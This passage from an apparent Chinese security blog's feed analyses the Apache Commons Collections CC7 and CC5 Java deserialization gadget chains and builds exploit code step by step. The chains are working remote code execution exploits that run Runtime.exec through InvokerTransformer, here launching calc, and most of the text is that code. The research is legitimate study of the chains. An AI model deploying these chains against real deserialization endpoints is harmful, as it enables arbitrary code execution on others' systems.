class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> decorateMap1 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        decorateMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> decorateMap2 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap2<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        decorateMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap2<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span><span class="token string">"iTransformers"</span><span class="token punctuation">,</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        decorateMap2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>hashtable<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;CC7 的链子和 CC5 类似，后半条链子也是 &lt;code&gt;LazyMap.get()&lt;/code&gt; 的链子，然后也换了个入口类&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE/&quot;&gt;https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-7-CC7&quot;&gt;https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-7-CC7&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="反序列化" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CC5链</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/09/06/CC5%E9%93%BE/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/09/06/CC5%E9%93%BE/</id>
    <published>2024-09-06T02:38:43.000Z</published>
    <updated>2024-09-06T08:12:53.205Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CC5，说白了就是在CC6的基础上换了个入口类</p><p>参考：</p><p><a href="https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8707-CC5%E9%93%BE/">https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8707-CC5%E9%93%BE/</a></p><span id="more"></span><hr><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>继续掏出之前的总结图</p><p><img src="/blog/2024/09/06/CC5%E9%93%BE/image-20240906104756602.png" alt="image-20240906104756602"></p><p>CC5的入口类是 <code>BadAttributeValueExpException</code> 的 <code>readObject()</code> 方法，这个不难理解</p><p>关键是这里的<code>LazyMap.get()</code> 方法被<code>TiedMapEntry.toString()</code>调用了，要找谁调用了<code>toString()</code>可太多了，只能正向分析</p><p>直接看 javax.management.BadAttributeValueExpException#readObject</p><p><img src="/blog/2024/09/06/CC5%E9%93%BE/image-20240906105302385.png" alt="image-20240906105302385"></p><p>这里调用了 <code>toString()</code> 方法，然后 <code>TiedMapEntry</code> 这个类调用了 <code>toString()</code> 方法</p><p><img src="/blog/2024/09/06/CC5%E9%93%BE/image-20240906105359987.png" alt="image-20240906105359987"></p><p>嗯，熟悉的 getValue，跟进一下后面就连上 <code>LazyMap.get</code> 了</p><p><img src="/blog/2024/09/06/CC5%E9%93%BE/image-20240906105540881.png" alt="image-20240906105540881"></p><p>那么就是让 valObj 为 TiedMapEntry 就行了</p><hr><h1 id="写exp"><a href="#写exp" class="headerlink" title="写exp"></a>写exp</h1><h2 id="LazyMap-get-部分"><a href="#LazyMap-get-部分" class="headerlink" title="LazyMap.get()部分"></a>LazyMap.get()部分</h2><p>后半段直接套 cc1的 LazyMapChain 即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc5</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> decorateMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">LazyMap</span><span class="token punctuation">></span></span> lazyMapClass <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> lazyGetMethod <span class="token operator">=</span> lazyMapClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        lazyGetMethod<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        lazyGetMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decorateMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PS：最后的反射部分是用来证明这个exp是可行的</p><h2 id="TiedMapEntry-toString-部分"><a href="#TiedMapEntry-toString-部分" class="headerlink" title="TiedMapEntry.toString()部分"></a>TiedMapEntry.toString()部分</h2><p><code>TiedMapEntry</code> 这个类继承了反序列化，并且是 public 的类，可操纵性非常强</p><p>直接看构造方法和相关的方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>map <span class="token operator">=</span> map<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>key <span class="token operator">=</span> key<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么只需要将map赋值为 decorateMap 即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>decorateMap<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tiedMapEntry<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>此时的exp：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc5</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 